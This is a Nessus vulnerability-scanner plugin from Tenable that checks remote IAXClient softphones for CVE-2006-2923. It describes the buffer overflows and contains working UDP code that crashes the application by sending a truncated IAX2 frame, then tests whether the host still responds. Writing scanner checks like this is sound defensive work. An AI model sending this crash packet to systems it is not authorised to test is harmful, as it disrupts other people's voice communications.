#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

There remote softphone is prone to multiple buffer overflow attacks. 

Description :

The remote host appears to be using a VoIP software phone application
that is affected by multiple buffer overflows.  With specially-crafted
UDP packets, an unauthenticated remote attacker may be able to
leverage these issues to crash the affected application or to execute
arbitrary code on the remote host subject to the privileges of the
user running it. 

See also :

http://www.coresecurity.com/common/showdoc.php?idx=548&idxseccion=10
http://www.securityfocus.com/archive/1/436638/30/0/threaded

Solution :

Obtain to a version of the client application built using a version of
IAXClient from June 6 2006 or later. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21684);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2923");
  script_bugtraq_id(18307);

  script_name(english:"IAXClient Truncated Frames Buffer Overflow Vulnerabilities");
  script_summary(english:"Tries to crash IAXClient application");

  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("iax2_detection.nasl");
  script_require_ports("Services/iax2", 4569);

  exit(0);
}


include("byte_func.inc");


port = get_kb_item("Services/iax2");
if (!port) port = 4569;
soc = open_sock_udp(port);


# Verify client responds to a POKE message.
poke = 
  mkword(0x8000) +                     # 'F' bit + source call number
  mkword(0) +                          # 'R' bit + dest call number
  mkdword(0) +                         # timestamp
  mkbyte(0) +                          # OSeqno
  mkbyte(0) +                          # ISeqno
  mkbyte(6) +                          # frametype, 6 => IAX frame
  mkbyte(0x1E);                        # 'C' bit + subclass, 0x1e => POKE request
send(socket:soc, data:poke);
res = recv(socket:soc, length:128);
if (
  strlen(res) != 12 ||
  ord(res[10]) != 6 ||
  (ord(res[11]) != 3 && ord(res[11]) != 4)
) exit(0);


# Send a packet in preparation of an exploit.
txcnt = 
  mkword(0x8000 | rand()) +
  mkword(0) +
  mkdword(rand()) +
  mkbyte(0) +
  mkbyte(0) +
  mkbyte(6) +
  mkbyte(0x17);
send(socket:soc, data:txcnt);
res = recv(socket:soc, length:128);


# Now exploit the flaw to crash the app.
txcnt = substr(txcnt, 0, strlen(txcnt)-2);
send(socket:soc, data:txcnt);
res = recv(socket:soc, length:128);


# Try to reconnect and send another POKE message to see if it's still up.
send(socket:soc, data:poke);
res = recv(socket:soc, length:128);
if (strlen(res) == 0) security_warning(port:port, protocol:"udp", data:desc);
